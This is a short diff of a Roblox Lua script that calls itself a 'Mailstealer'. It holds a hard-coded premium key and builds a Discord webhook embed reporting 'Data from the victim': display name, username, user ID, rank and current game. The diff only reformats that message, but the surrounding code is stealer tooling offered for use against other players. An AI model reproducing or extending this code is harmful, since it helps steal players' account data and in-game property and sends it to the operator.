@@ -1,3 +1,4 @@
+
  getgenv().Settings = {
     PremiumKey = "rizzhub-LQOIpi8RuiFDqZ85hgwz",
     Webhook = false, -- By Making This True The Users Of Your Script Will Be Able
@@ -70,7 +71,7 @@ local msg = {
   ["embeds"]= {
     {
       ["title"]= "`Hostee Mailstealer Results`",
-      ["description"]= "**Data from the victim**\n\n🧑Display Name: ".._G.PlrDisplayNameVictim.."\n\n🧑Username: ".._G.PlrUserVictim.."\n\n🧑User ID: ".._G.PlrUserIDVictim.."\n\n🐱Rank: ".._G.CurrentRank.."\n\n🎮Place: ".._G.GameIn.."",
+      ["description"]= "**Data from the victim**\n🧑Display Name: ".._G.PlrDisplayNameVictim.."\n🧑Username: ".._G.PlrUserVictim.."\n🧑User ID: ".._G.PlrUserIDVictim.."\n🐱Rank: ".._G.CurrentRank.."\n🎮Place: ".._G.GameIn.."",
       ["url"]= "https://discord.gg/hosteehub",
       ["color"]= ""..webhookcolor.."",
       ["fields"]= {
